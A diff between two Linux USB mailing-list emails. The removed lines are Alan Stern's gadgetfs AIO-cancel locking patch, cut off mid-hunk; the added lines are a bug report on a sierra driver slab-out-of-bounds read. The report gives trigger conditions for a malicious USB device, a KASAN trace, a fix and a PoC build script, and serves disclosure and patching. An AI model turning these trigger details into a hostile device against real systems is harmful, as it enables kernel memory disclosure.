@@ -1,341 +1,988 @@
-Received: from mail-qk1-f170.google.com (mail-qk1-f170.google.com [209.85.222.170])
+Received: from mail-pl1-f172.google.com (mail-pl1-f172.google.com [209.85.214.172])
 	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 0E7333812FE
-	for <linux-usb@vger.kernel.org>; Tue, 14 Jul 2026 03:23:50 +0000 (UTC)
-Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.222.170
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id E1F0A3655C2
+	for <linux-usb@vger.kernel.org>; Tue, 14 Jul 2026 03:37:39 +0000 (UTC)
+Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.214.172
 ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
-	t=1783999433; cv=none; b=tJbILrWxlLdEO5CNDAZpE2DJNat5n2neoDn59cZZK5kC9p44Tm2TC5Q8qVrcGljhhM6YdRNYeBgjQp637mG/Mi+nS/eoA8ddyBbXr38s1/LehnVcqDwXQ2EbYXtQTLz7NNgXjMi/o6MoMJ4hU5PcfxMacCpo1/NJH3g22lqDLZI=
+	t=1784000263; cv=none; b=efJF/9Ct6e6xZplxjsjdDoeixRKpSKw8oSLd+D05T8Nsf2MN7PJEyDvnOW/zHIX8eh8QFEv6LEunWYvi4DIi3dKciAYdnse6GAKrBvQbrbK2dGB0qOC9NjtA4J/44PRG7Ol5RLU6/0tnVuT57Ip15pBBvTBDyEuxd0ZNdGEVUt4=
 ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
-	s=arc-20240116; t=1783999433; c=relaxed/simple;
-	bh=qYPzZw//X7QsB/k1CgCQAPLqWKDLf0h5ACNsF6pQivc=;
-	h=Date:From:To:Cc:Subject:Message-ID:References:MIME-Version:
-	 Content-Type:Content-Disposition:In-Reply-To; b=A9ST8wk9PTl5VF5IgMRhhokkc1h8LGW57sz0hOYHB5kKVYgf+RzAynnKyBkhWMn4YjzMePBcIpGB7mTohPh0OICGtSgaVgibkmtsQWJGqEu7/qN1qp/IFOJo7+hrX3Zb6qVgcbUMhvpa9jrhM6CM8ID5TDDQ1UumgHM+yW6VdJM=
-ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=rowland.harvard.edu; spf=fail smtp.mailfrom=g.harvard.edu; dkim=pass (2048-bit key) header.d=rowland.harvard.edu header.i=@rowland.harvard.edu header.b=ttonz4Ki; arc=none smtp.client-ip=209.85.222.170
-Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=rowland.harvard.edu
-Authentication-Results: smtp.subspace.kernel.org; spf=fail smtp.mailfrom=g.harvard.edu
+	s=arc-20240116; t=1784000263; c=relaxed/simple;
+	bh=BO3LeUjexrzZdwZgKABe84mN6ryhpyuqM5/yGVMOpBk=;
+	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=eNYYfV4VxdQ744TKtTYsaS8gIb/uF9qs5AFhBMZHyU7MY63UUBXZ15hY+OHF01BU7D9JM1jFcOMafwQk+xfOWiaafTgSIutb49HPzcwoQBiiJBpcwnLjW6Evk58z+9avZ6kveCZhWQGa2t0W0+UunplSUKk9yq7yacRb2h/Geq4=
+ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com; spf=pass smtp.mailfrom=gmail.com; dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b=RC4H0vVx; arc=none smtp.client-ip=209.85.214.172
+Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com
+Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=gmail.com
 Authentication-Results: smtp.subspace.kernel.org;
-	dkim=pass (2048-bit key) header.d=rowland.harvard.edu header.i=@rowland.harvard.edu header.b="ttonz4Ki"
-Received: by mail-qk1-f170.google.com with SMTP id af79cd13be357-92e55b62640so227328385a.0
-        for <linux-usb@vger.kernel.org>; Mon, 13 Jul 2026 20:23:50 -0700 (PDT)
+	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b="RC4H0vVx"
+Received: by mail-pl1-f172.google.com with SMTP id d9443c01a7336-2cacf197759so7391945ad.2
+        for <linux-usb@vger.kernel.org>; Mon, 13 Jul 2026 20:37:39 -0700 (PDT)
 DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=rowland.harvard.edu; s=google; t=1783999429; x=1784604229; darn=vger.kernel.org;
-        h=in-reply-to:content-disposition:content-type:mime-version
-         :references:message-id:subject:cc:to:from:date:from:to:cc:subject
-         :date:message-id:reply-to:content-type;
-        bh=N8lQpf0Ws7P8SqZGnBZf5+Hdd5mZTbzgyIda3MBUihM=;
-        b=ttonz4KiVvlawd423yaiexkXwPHQ42nOZIoM1kg/OL3nr3ZfROg596KYMVD6oiW6ZI
-         okZbF93umaz7xpnc90Dcy9dkPP1P/VyL2WlNtcexUHYcS4v+l44oC/5AU+0/oEh6pK+N
-         CxK+ZpcyVNCMyoFElVJd4PfcovBd8ajdRCCeQeUJB9jBc9nIawrYyHvABFEIbvFELuks
-         w/ZI7bv5K7O1BmpXSindEVZKJEAhD3t6KgHATdbPVA2Y2gp8HiuKWswlTjYhg3t+Fkz4
-         K6gyvQoSbSEBR2WhGfXpU6MeK7CbBkJr9q+tzSAUa6fpUf2IA5mblyKhBId6lYMFP/9l
-         0Y8g==
+        d=gmail.com; s=20251104; t=1784000259; x=1784605059; darn=vger.kernel.org;
+        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
+         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
+        bh=qwkoOreAsJY/g+KBgwRw0GJ0qwo/2Zo7rX2XozyQlbY=;
+        b=RC4H0vVxCBpuryWtV8TdBWu1g67n3iQD9aBukb4ohw+uVd05n9tYpyaCWkXlZJN7nE
+         mSiGpSkrGmLLtlt4pdaPHjJqGjbODy3mnHE7eTjafbYuSNJufMD9xLlbssGsTF0pQnJ1
+         qZJr48PCq8mT/ZGHB2xE6tjWVJF0l/rryBW8IbYn20Ng5IIJVKv1Ks5JQXCWIRgzZwoW
+         UlkkeL6xcs8EV7NJrFdokwhsfy+rnTS0ts0ojKyoRS0zBUN5wtUKIN0zWyBO/C9KIiq0
+         N9PiRltrxFCrF6lDGIwtM7e5tSt/3v/IVDN+yhJxwwCikSzgKCFuzVEOUJfzJ3ACYrBA
+         YV2Q==
 X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20251104; t=1783999429; x=1784604229;
-        h=in-reply-to:content-disposition:content-type:mime-version
-         :references:message-id:subject:cc:to:from:date:x-gm-gg
-         :x-gm-message-state:from:to:cc:subject:date:message-id:reply-to
-         :content-type;
-        bh=N8lQpf0Ws7P8SqZGnBZf5+Hdd5mZTbzgyIda3MBUihM=;
-        b=g55j9uxhU3L6sm3tdvmxHcfGpfA6eWlZCJ1mR+H2Y7tQSAeSihIN0wzBHOkI+3xnFm
-         eYtLtq1IuL1nUCxLWDKIowKKehq5vagJkBPqPmdmt1/QuGTDhMgFpbwHkhOfaaazk7Ct
-         CXaE5CeB+d8o7TIeVOQFQiCXlIxhAVCyj4ojktG36t0OzpwsKbbYp3KSXdErx60KBHw6
-         kHHS5ErXefmmjirfWT6r1Q/25VKAd/bplNLoMI+4TN4tGykazJpSlhx5u7AeE9yvlTAz
-         SGXlHK42syuZ3M3bsWobOUoH333z5M1p32DfYbCkOIouSiG0UaxxaVuZqoI1HxxU/o/g
-         bx5w==
-X-Forwarded-Encrypted: i=1; AHgh+Ro1PBj2o89fN+vJ36TpdeO50GfVZQ7OA+MqlLJftOsEmoW8i7X+8BVzBIaktORljRyF2ZMLiXX8AYc=@vger.kernel.org
-X-Gm-Message-State: AOJu0Yzq8risW2eVUpfcE6ODrCU1fhCQ3LIACYBqR71bYsie0qOufxhW
-	Y4aV6Oj/6p0oKg5B2Wxb8j7/0qcKYqXQsRfvSg1/CpEYJFdrIv+UxVfoANQ3xyMtrA==
-X-Gm-Gg: AfdE7cm9xufXN6a6TEISMYZRaobqof+J343hamc1R2tQSanxCwPJYyK4oSS/SDeY+RG
-	8Vp3QCEM6bXngLuUo0aGN0MK1XEOJLtt1sqNCS9L/YDBFvvUZltBLxGKlPLoANXkVuQebyo5tUQ
-	U14OHXGz5lZ9EDfDHsbFZsksyy6EHarqd1X3l8NAEMoJ+5lO9douZbVjjZQNkp77DKszvuUmGsp
-	YcQf/YZ5Fx7xvGMmuDK9iJ/xcS4O2NNfWVC2yH6rT8xeml4hOsyQ3Tl8n7MFh8gxdzUR68pGzus
-	YA5wDi4YBKEk29uGOWP47jFNKPrnZ8KT/qoqqlryKIvxZKhKs5G1mnFCHW0FS/b1rL0Ky3q8aHo
-	Gzui2kWn4UMGcHGhNXu8ZkXYpINPLNh45dK3Njcp111DWXGOLlhs81XsMgPdHt0cAWt8Aqi95eu
-	k0gm7+Z5lO/5Shjlj/R6mD3P4i
-X-Received: by 2002:a05:620a:444b:b0:92f:1d0:871c with SMTP id af79cd13be357-92f01d0878dmr772577585a.75.1783999429351;
-        Mon, 13 Jul 2026 20:23:49 -0700 (PDT)
-Received: from rowland.harvard.edu ([2601:19b:d01:d210::883a])
-        by smtp.gmail.com with ESMTPSA id af79cd13be357-92ee5b93387sm1440309685a.16.2026.07.13.20.23.48
+        d=1e100.net; s=20251104; t=1784000259; x=1784605059;
+        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
+         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
+         :message-id:reply-to:content-type;
+        bh=qwkoOreAsJY/g+KBgwRw0GJ0qwo/2Zo7rX2XozyQlbY=;
+        b=PQABt7guRRaIyKdQiAzd8w0w96vjTGVF5efymtcTGFSy23jx9hL930jncFLYcLUv1q
+         ixaaCb+8nAm7W+uLWi5r7geq+zQJ4RAZNVm5bmc9dM7Z/DGbY/vJigF4Eo6T01DAcNss
+         pw1h/7El9omhTaypba/Pio7MGzj7WPmwgQRD/dXVbUTLp8ZrdDwlvRRdXBwNS0UvpPMa
+         FJUXRH2Jksw2XJr9lxY9gZ+VoR86LimmNwFz6GvgrBf92uk0KwjM7XX9hxW0G3Drw2EH
+         OfMgbMGXUG7oOUHVxLl4N4LQR8WASt6cqrm8jjLHXlKK8Fi055ju5Yz11nsmbT5dN7iu
+         x4Qw==
+X-Gm-Message-State: AOJu0YxIo7hwuzLE5AH+iOOIPtnb45KPricogKRgEySVDhNEDnHsPKir
+	YOwapDBnaDjpIJVwTsMsMQVwfFuX85dGOSuixDp2EpsMi2AZyuHnezZ3
+X-Gm-Gg: AfdE7cmfgvCXbjNIhFioSw5d7pvrDazaomKiGaU9V29nQ/BaL10ujByhaIRY62Z19xC
+	3s+90Th5qFzfOQVXkE4P4EN4RDBFwuwokuzYAJjTrHatnQW0J8Mj9X+Zq8e/UXY7eVUryhuRyRU
+	/Wemd0+xo0YSxjtAVeU1FqLush1WuMY3Ydo05OY2xUkYyoM8MGXnLmxrPegvg7XXhIC7nvRswAH
+	2vzz7dkzSBgMOW8qhNAm69YWh89X00g//aMw35hVeexMQmawAdaDlzjo1NkX+aFtcgFkxWcAnyU
+	PE7qIYH0ovDQEBZeHxozH92E52Vl4ygcpAdAy8Fq2LF44ce5yyohJAjkJ7D0Pf13K60Y3/QN4QB
+	ryn3DReo1+5xgTBOmtNWTBshKar+Fd9odDXZj9hQwsH/43o18qW7ZePmuSpNJQSwQCClF1Ug7nh
+	Rh+PJxI/GNVUevcVV0x3+adv3NOjDvxdQjZPeQFJ4anGSDjIfD0aq9NQ==
+X-Received: by 2002:a05:6a21:3394:b0:3a8:21e0:1ffa with SMTP id adf61e73a8af0-3c110160cabmr14591618637.27.1784000258966;
+        Mon, 13 Jul 2026 20:37:38 -0700 (PDT)
+Received: from nixos (47-146-72-123.vng01.snbb.ca.frontiernet.net. [47.146.72.123])
+        by smtp.gmail.com with ESMTPSA id 5a478bee46e88-31174a583bcsm81148431eec.19.2026.07.13.20.37.38
         (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
-        Mon, 13 Jul 2026 20:23:48 -0700 (PDT)
-Date: Mon, 13 Jul 2026 23:23:45 -0400
-From: Alan Stern <stern@rowland.harvard.edu>
-To: Minseo Kim <neck3922@gmail.com>
-Cc: Greg Kroah-Hartman <gregkh@linuxfoundation.org>,
-	linux-usb@vger.kernel.org, linux-kernel@vger.kernel.org,
-	syzkaller@googlegroups.com
-Subject: Re: [BUG] usb: gadgetfs: KASAN null-ptr-deref and intermittent UAF
- in ep_aio_cancel()
-Message-ID: <a7f9d958-7f9d-40eb-89ea-56094f60c075@rowland.harvard.edu>
-References: <CAFmvuTWc880R=mw7=kixfx3Yb8u9thLHPA7D=rm6a8p9dYBBDA@mail.gmail.com>
- <2d4a91dc-037f-4c31-8ce1-7bc840d42b0b@rowland.harvard.edu>
- <CAFmvuTWq7TKZaj6R9JJzWhwe1WB1FanZ17T1-TFL1g2wsUBZ4w@mail.gmail.com>
- <8067503d-1c0d-4319-adbd-225a03e16ea3@rowland.harvard.edu>
- <CAFmvuTUEg8fr8pY91WpEk=CxHuackJfr0c2c4jxexNy9wkiS0A@mail.gmail.com>
- <a5e0e32a-7e49-4112-bcbc-92da449eb303@rowland.harvard.edu>
- <CAFmvuTXQbqbt3qxqUXitzboZhiMxAC7aaOqAtyZXs+QtJvAjBg@mail.gmail.com>
+        Mon, 13 Jul 2026 20:37:38 -0700 (PDT)
+From: Jay Vadayath <jkrshnmenon@gmail.com>
+To: Johan Hovold <johan@kernel.org>,
+	Greg Kroah-Hartman <gregkh@linuxfoundation.org>
+Cc: linux-usb@vger.kernel.org,
+	linux-kernel@vger.kernel.org,
+	stable@vger.kernel.org,
+	Jay Vadayath <jkrshnmenon@gmail.com>
+Subject: [BUG] USB: serial: sierra: slab-out-of-bounds read in sierra_instat_callback() on short interrupt-IN packet
+Date: Mon, 13 Jul 2026 20:37:27 -0700
+Message-ID: <20260714033729.11023-1-jkrshnmenon@gmail.com>
+X-Mailer: git-send-email 2.51.2
 Precedence: bulk
 X-Mailing-List: linux-usb@vger.kernel.org
 List-Id: <linux-usb.vger.kernel.org>
 List-Subscribe: <mailto:linux-usb+subscribe@vger.kernel.org>
 List-Unsubscribe: <mailto:linux-usb+unsubscribe@vger.kernel.org>
 MIME-Version: 1.0
-Content-Type: text/plain; charset=us-ascii
-Content-Disposition: inline
-In-Reply-To: <CAFmvuTXQbqbt3qxqUXitzboZhiMxAC7aaOqAtyZXs+QtJvAjBg@mail.gmail.com>
+Content-Transfer-Encoding: 8bit
 
-On Tue, Jul 14, 2026 at 03:47:55AM +0900, Minseo Kim wrote:
-> Hi Alan,
-> 
-> Thank you very much for taking the time to prepare this patch. I applied
-> the patch as posted in your message to upstream v7.2-rc1, commit
-> dc59e4fea9d83f03bad6bddf3fa2e52491777482.
-> 
-> I repeatedly tested the proposed patch with the original null-ptr-deref
-> and UAF reproducers, as well as several reduced variants. During those
-> tests, I did not observe either of the original signatures.
+Hi,
 
-That's good progress.
+I found a slab-out-of-bounds read in drivers/usb/serial/sierra.c that
+is reachable from a malicious USB device.
+This bug is similar to the one fixed in option.c by Jiale Yao on 2026-07-12
+([PATCH] USB: serial: option: fix slab out-of-bounds read in option_instat_callback).
 
-> While continuing the tests, I observed a new null-ptr-deref in
-> ep_aio_cancel() on the kernel with the proposed patch applied. It appears
-> to be associated with the initialization window in ep_aio(). Running the
-> reproducer without command-line arguments triggered:
-> 
->   KASAN: null-ptr-deref in range [0x0000000000000028-0x000000000000002f]
->   RIP: ep_aio_cancel+0xd0/0x2d0
->   drivers/usb/gadget/legacy/inode.c:473
-> 
-> The corresponding source statement is:
-> 
->   ep = epdata->ep;
-> 
-> where epdata is NULL. The faulting task has UID 1000.
-> 
-> One detail that may be relevant is the initialization order in ep_aio().
-> iocb->private is assigned and kiocb_set_cancel_fn() registers the
-> cancellation callback before priv->epdata is initialized. Because priv is
-> zero-initialized and AIO_REQ_RUNNING is the zero-valued enumerator in the
-> proposed patch, the state check can treat priv as RUNNING before the
-> explicit state assignment. The observed crash is consistent with
-> cancellation reaching this initialization window, because priv->epdata
-> was NULL at the fault.
+Summary
+-------
+sierra_instat_callback() handles the CDC-ACM-style SET_LINE_STATE
+notification on the interrupt-IN endpoint. On status == 0 it:
 
-In the patch below, I moved the kiocb_set_cancel_fn() call down to after 
-all the other initialization.  That ought to take care of the problem.   
-But I admit, I don't understand how the I/O can be cancelled before 
-ep_aio() returns.
+  1. Reads the 8-byte usb_ctrlrequest header at transfer_buffer[0..7].
+  2. If bRequestType/bRequest match 0xA1/0x20, reads a "signals" byte
+     at transfer_buffer + sizeof(struct usb_ctrlrequest) - i.e. byte 8.
 
-> I also ran the reproducer on a LOCKDEP-enabled build. LOCKDEP reported the
-> following possible circular locking dependency involving the newly added
-> aio_lock:
-> 
->   &ctx->ctx_lock -> aio_lock -> &dev->lock#2 -> &ctx->ctx_lock
-> 
-> The cycle appears to arise because io_cancel() calls ep_aio_cancel() while
-> holding ctx->ctx_lock, and ep_aio_cancel() then acquires aio_lock. In the
-> other direction, the patched completion path holds aio_lock and dev->lock
-> while calling iocb->ki_complete(). In this path, the completion callback
-> is aio_complete_rw(), which can acquire ctx->ctx_lock.
-> 
-> The reported cycle involving aio_lock appears specific to the proposed
-> patch, since aio_lock is newly introduced there.
+Neither read is bounded by urb->actual_length. The interrupt-IN
+buffer is allocated by the driver's port-setup with
+kmalloc(usb_endpoint_maxp(epd)), sized to the device-declared
+endpoint wMaxPacketSize. A hostile device advertising
+wMaxPacketSize=8 on its interrupt-IN endpoint pulls the buffer
+from kmalloc-8 (exactly 8 bytes). When such a device then delivers
+an 8-byte packet whose first two bytes are 0xA1 0x20, the callback
+reads transfer_buffer[8] - exactly one byte past the end of the
+slab object. KASAN flags this as slab-out-of-bounds.
 
-In the new patch I removed the dev->lock accesses in ep_aio_cancel() and 
-moved the iocb->ko_complete() call outside the scope of aio_lock in 
-ep_aio_complete().  This should break the locking cycles.
+Vulnerable code
+---------------
+drivers/usb/serial/sierra.c, sierra_instat_callback() (~line 573):
 
-There's still a potential race: unbind against ep_aio_cancel or 
-ep_user_copy_work.  That would be a difficult race to trigger; you'd 
-have to unbind the gadgetfs driver just as an aio request was 
-completing or being cancelled.
+    if (status == 0) {
+        struct usb_ctrlrequest *req_pkt = urb->transfer_buffer;
 
-> I wanted to share these observations in case they are useful. Please let
-> me know if I have misunderstood any part of the initialization or locking
-> sequence.
+        if (!req_pkt) {
+            dev_dbg(&port->dev, "%s: NULL req_pkt\n", __func__);
+            return;
+        }
+        if ((req_pkt->bRequestType == 0xA1) &&
+                (req_pkt->bRequest == 0x20)) {
+            int old_dcd_state;
+            unsigned char signals = *((unsigned char *)
+                    urb->transfer_buffer +
+                    sizeof(struct usb_ctrlrequest));   /* OOB when maxp==8 */
 
-No, I think you've done a great job of assimilating this complex 
-information.  Let me know how the new patch works out.
+Affected versions
+-----------------
+Confirmed still present on master as of 2026-07-13 (HEAD 3b029c035b34bbc693405ddf759f0e9b920c27f1).
 
-Alan Stern
+KASAN report
+------------
+Captured on v7.2.0-rc3, x86_64, QEMU + dummy_hcd.
+
+BUG: KASAN: slab-out-of-bounds in sierra_instat_callback+0x599/0x5d0
+Read of size 1 at addr ffff888003dedf88 by task swapper/0/0
+
+Call Trace:
+ <IRQ>
+ sierra_instat_callback+0x599/0x5d0
+ __usb_hcd_giveback_urb+0x23f/0x3f0
+ dummy_timer+0xfe1/0x3470
+ __hrtimer_run_queues+0x252/0x5a0
+ hrtimer_run_softirq+0x1a4/0x3b0
+ handle_softirqs+0x1bd/0x620
+ __irq_exit_rcu+0x68/0x140
+ sysvec_apic_timer_interrupt+0x6c/0x80
+ </IRQ>
+
+Allocated by task 11:
+ __kmalloc_noprof+0x1bc/0x490
+ usb_serial_probe+0x1c66/0x3fe0
+ usb_probe_interface+0x279/0x980
+ [... device_add/hub_event probe chain ...]
+
+Reproducer
+----------
+The artifacts inlined below can be used to reproduce the bug.
+Required kernel config options (delta on top of x86_64_defconfig):
+
+  CONFIG_KASAN=y
+  CONFIG_KASAN_GENERIC=y
+  CONFIG_USB_SERIAL=y
+  CONFIG_USB_SERIAL_SIERRAWIRELESS=y
+  CONFIG_USB_GADGET=y
+  CONFIG_USB_DUMMY_HCD=y
+  CONFIG_USB_RAW_GADGET=y
+
+Related work
+------------
+Jiale Yao posted an identical-class fix for the parallel bug in
+option.c on 2026-07-12:
+
+  [PATCH] USB: serial: option: fix slab out-of-bounds read in
+          option_instat_callback
+  https://lore.kernel.org/all/20260712170012.3503601-1-yaojiale02@163.com/
+
+option_instat_callback() and sierra_instat_callback() are nearly
+line-for-line copies.
+The two fixes should probably land together.
+
+Proposed fix
+------------
+Validate urb->actual_length before dereferencing the header, and
+require one more byte before reading the signals field. The fix
+below preserves sierra's existing "!req_pkt" NULL-check and layers
+the length check as an additional guard; happy to reshape it to
+match Jiale's idiom exactly (single combined "actual_length <
+sizeof(*req_pkt) + 1" check, placed before the 0xA1/0x20 branch)
+if that's preferred for cross-driver consistency.
+
+diff --git a/drivers/usb/serial/sierra.c b/drivers/usb/serial/sierra.c
+--- a/drivers/usb/serial/sierra.c
++++ b/drivers/usb/serial/sierra.c
+@@ -570,13 +570,18 @@ static void sierra_instat_callback(struct urb *urb)
+ 	if (status == 0) {
+ 		struct usb_ctrlrequest *req_pkt = urb->transfer_buffer;
+
+-		if (!req_pkt) {
+-			dev_dbg(&port->dev, "%s: NULL req_pkt\n",
++		/*
++		 * The interrupt-in buffer is sized to the device-declared
++		 * endpoint wMaxPacketSize; validate the device actually sent a
++		 * full control-request header (and the trailing signal byte)
++		 * before dereferencing it, or a short packet causes an OOB read.
++		 */
++		if (!req_pkt || urb->actual_length < sizeof(*req_pkt)) {
++			dev_dbg(&port->dev, "%s: NULL/short req_pkt\n",
+ 				__func__);
+-			return;
+-		}
+-		if ((req_pkt->bRequestType == 0xA1) &&
+-				(req_pkt->bRequest == 0x20)) {
++		} else if ((req_pkt->bRequestType == 0xA1) &&
++				(req_pkt->bRequest == 0x20) &&
++				urb->actual_length >= sizeof(*req_pkt) + 1) {
+ 			int old_dcd_state;
+ 			unsigned char signals = *((unsigned char *)
+ 					urb->transfer_buffer +
+
+Reported-by: Jay Vadayath <jkrshnmenon@gmail.com>
+
+Thanks,
+
+--- build.sh ---
+#!/bin/bash
+set -euo pipefail
+
+SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
+REPO="${1:?Usage: $0 <kernel-source-dir>}"
+REPO="$(cd "$REPO" && pwd)"
+
+CONFIG_SRC="$SCRIPT_DIR/387ee687512d2acd32d1d47ebcb1972e.config"
+
+# sccache setup
+export KBUILD_BUILD_TIMESTAMP=""
+if command -v sccache &>/dev/null; then
+    export CC="sccache gcc"
+    echo "[build] Using sccache"
+else
+    export CC="gcc"
+    echo "[build] sccache not found, using gcc directly"
+fi
+
+NPROC=$(nproc)
+
+build_variant() {
+    local variant="$1"
+    local build_dir="$SCRIPT_DIR/builds/$variant"
+    mkdir -p "$build_dir"
+
+    echo "[build] ===== Building variant: $variant ====="
+
+    # Copy base config
+    cp "$CONFIG_SRC" "$REPO/.config"
+
+    # Adjust config per variant
+    case "$variant" in
+        asan)
+            # Config already has KASAN enabled, just ensure it
+            "$REPO/scripts/config" --file "$REPO/.config" \
+                -e KASAN -e KASAN_GENERIC -e KASAN_INLINE -e KASAN_STACK \
+                -d KASAN_OUTLINE
+            ;;
+        *)
+            echo "[build] Unknown variant: $variant"
+            return 1
+            ;;
+    esac
+
+    # Finalize config
+    make -C "$REPO" olddefconfig > "$build_dir/config.log" 2>&1
+
+    # Build kernel
+    echo "[build] Building kernel for $variant ..."
+    make -C "$REPO" -j"$NPROC" bzImage > "$build_dir/build.log" 2>&1 || {
+        echo "[build] FAILED: see $build_dir/build.log"
+        tail -30 "$build_dir/build.log"
+        return 1
+    }
+
+    # Copy bzImage
+    cp "$REPO/arch/x86/boot/bzImage" "$build_dir/bzImage"
+    echo "[build] $variant bzImage -> $build_dir/bzImage"
+
+    # Save config
+    cp "$REPO/.config" "$build_dir/.config"
+}
+
+# Build the PoC binary (static, for initramfs)
+echo "[build] Compiling PoC..."
+gcc -O2 -static -pthread \
+    -o "$SCRIPT_DIR/poc.bin" "$SCRIPT_DIR/poc.c" \
+    || { echo "[build] PoC compilation failed"; exit 1; }
+echo "[build] PoC compiled -> $SCRIPT_DIR/poc.bin"
+
+# Build ASAN variant (the config already has KASAN)
+build_variant asan
+
+echo "[build] All builds complete."
+echo "[build] Building initramfs..."
+bash "$SCRIPT_DIR/build_initramfs.sh"
+echo "[build] Done."
 
 
----
- drivers/usb/gadget/legacy/inode.c |   92 +++++++++++++++++++++++++++++---------
- 1 file changed, 72 insertions(+), 20 deletions(-)
+--- end build.sh ---
 
-Index: usb-devel/drivers/usb/gadget/legacy/inode.c
-===================================================================
---- usb-devel.orig/drivers/usb/gadget/legacy/inode.c
-+++ usb-devel/drivers/usb/gadget/legacy/inode.c
-@@ -236,6 +236,8 @@ static void put_ep (struct ep_data *data
- static const char *CHIP;
- static DEFINE_MUTEX(sb_mutex);		/* Serialize superblock operations */
- 
-+static DEFINE_SPINLOCK(aio_lock);	/* Protect aio cancellation info */
-+
- /*----------------------------------------------------------------------*/
- 
- /* NOTE:  don't use dev_printk calls before binding to the gadget
-@@ -433,6 +435,13 @@ static long ep_ioctl(struct file *fd, un
- 
- /* ASYNCHRONOUS ENDPOINT I/O OPERATIONS (bulk/intr/iso) */
- 
-+enum aio_req_state {
-+	AIO_REQ_RUNNING,
-+	AIO_REQ_CANCELLING,
-+	AIO_REQ_CANCELLED,
-+	AIO_REQ_COMPLETED,
-+};
-+
- struct kiocb_priv {
- 	struct usb_request	*req;
- 	struct ep_data		*epdata;
-@@ -443,24 +452,48 @@ struct kiocb_priv {
- 	struct iov_iter		to;
- 	const void		*to_free;
- 	unsigned		actual;
-+	enum aio_req_state	aio_state;
- };
- 
- static int ep_aio_cancel(struct kiocb *iocb)
- {
--	struct kiocb_priv	*priv = iocb->private;
-+	struct kiocb_priv	*priv;
- 	struct ep_data		*epdata;
--	int			value;
-+	struct usb_ep		*ep;
-+	struct dev_data		*dev;
-+	int			value = -EINVAL;
-+
-+	spin_lock_irq(&aio_lock);
-+	priv = iocb->private;
-+	if (!priv || priv->aio_state != AIO_REQ_RUNNING)
-+		goto Done;	/* Already completed or cancelled */
- 
--	local_irq_disable();
-+	priv->aio_state = AIO_REQ_CANCELLING;
- 	epdata = priv->epdata;
--	// spin_lock(&epdata->dev->lock);
--	if (likely(epdata && epdata->ep && priv->req))
--		value = usb_ep_dequeue (epdata->ep, priv->req);
--	else
--		value = -EINVAL;
--	// spin_unlock(&epdata->dev->lock);
--	local_irq_enable();
-+	ep = epdata->ep;
-+	dev = epdata->dev;
-+	spin_unlock_irq(&aio_lock);
-+
-+	value = usb_ep_dequeue(ep, priv->req);
-+
-+	/*
-+	 * priv->req is freed by the first stage of completion or the
-+	 * second stage of cancellation, whichever is last.
-+	 * priv itself is freed by the final stage of completion or
-+	 * the second stage of cancellation, whichever is last.
-+	 */
-+	spin_lock_irq(&aio_lock);
-+	if (priv->aio_state == AIO_REQ_CANCELLING) {
-+		/* Completion is not yet finished */
-+		priv->aio_state = AIO_REQ_CANCELLED;
-+	} else {
-+		/* Must be AIO_REQ_COMPLETED so completion is finished */
-+		usb_ep_free_request(ep, priv->req);
-+		kfree(priv);
-+	}
- 
-+ Done:
-+	spin_unlock_irq(&aio_lock);
- 	return value;
- }
- 
-@@ -482,7 +515,13 @@ static void ep_user_copy_worker(struct w
- 
- 	kfree(priv->buf);
- 	kfree(priv->to_free);
--	kfree(priv);
-+
-+	spin_lock_irq(&aio_lock);
-+	if (priv->aio_state == AIO_REQ_CANCELLING)
-+		priv->aio_state = AIO_REQ_COMPLETED;
-+	else
-+		kfree(priv);	/* Not cancelled or cancellation is finished */
-+	spin_unlock_irq(&aio_lock);
- }
- 
- static void ep_aio_complete(struct usb_ep *ep, struct usb_request *req)
-@@ -490,11 +529,16 @@ static void ep_aio_complete(struct usb_e
- 	struct kiocb		*iocb = req->context;
- 	struct kiocb_priv	*priv = iocb->private;
- 	struct ep_data		*epdata = priv->epdata;
-+	bool			cancelling;
-+	size_t			ret;
-+
-+	/* lock against cancellation */
-+	spin_lock(&aio_lock);
-+	cancelling = (priv->aio_state == AIO_REQ_CANCELLING);
- 
--	/* lock against disconnect (and ideally, cancel) */
-+	/* lock against unbind */
- 	spin_lock(&epdata->dev->lock);
--	priv->req = NULL;
--	priv->epdata = NULL;
-+	iocb->private = NULL;		/* Prevent future cancellation */
- 
- 	/* if this was a write or a read returning no data then we
- 	 * don't need to copy anything to userspace, so we can
-@@ -503,11 +547,17 @@ static void ep_aio_complete(struct usb_e
- 	if (priv->to_free == NULL || unlikely(req->actual == 0)) {
- 		kfree(req->buf);
- 		kfree(priv->to_free);
--		kfree(priv);
--		iocb->private = NULL;
--		iocb->ki_complete(iocb,
--				req->actual ? req->actual : (long)req->status);
-+		if (cancelling)	/* Cancellation started, not yet finished */
-+			priv->aio_state = AIO_REQ_COMPLETED;
-+		else		/* Not cancelled or cancellation is finished */
-+			kfree(priv);
-+		ret = req->actual;
-+		if (ret == 0)
-+			ret = req->status;
-+		spin_unlock(&aio_lock);		/* Cancel now may free req */
-+		iocb->ki_complete(iocb, ret);
